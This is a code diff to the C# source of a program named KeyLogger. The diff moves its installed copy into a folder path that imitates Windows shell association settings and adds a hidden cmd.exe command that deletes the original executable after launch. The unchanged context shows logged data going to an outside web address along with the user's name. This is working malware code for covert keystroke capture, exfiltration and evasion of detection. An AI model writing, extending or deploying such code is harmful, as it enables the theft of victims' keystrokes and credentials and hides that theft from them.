@@ -19,7 +19,7 @@ namespace KeyLogger
         private static readonly HttpClient client = new HttpClient();
         private static readonly string apiUrl = "https://keylogger.delphigamerz.xyz/log?username=" + Environment.UserName;
 
-        private static string InstallPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "KeyLogger", "KeyLogger.exe");
+        private static string InstallPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Microsoft", "Windows", "Shell", "Associations", "UrlAssociations", "http", "UserChoice", "KeyLogger.exe");
 
         private static bool[] lastKeyState = new bool[256];
 
@@ -183,6 +183,17 @@ namespace KeyLogger
 
                     // Start the installed version
                     Process.Start(InstallPath);
+
+                    // Self-deletion of the original executable
+                    ProcessStartInfo psi = new ProcessStartInfo
+                    {
+                        FileName = "cmd.exe",
+                        Arguments = $"/C choice /C Y /N /D Y /T 3 & del \"{currentExe}\"",
+                        WindowStyle = ProcessWindowStyle.Hidden,
+                        CreateNoWindow = true
+                    };
+                    Process.Start(psi);
+
                     Environment.Exit(0);
                 }
                 catch (Exception)
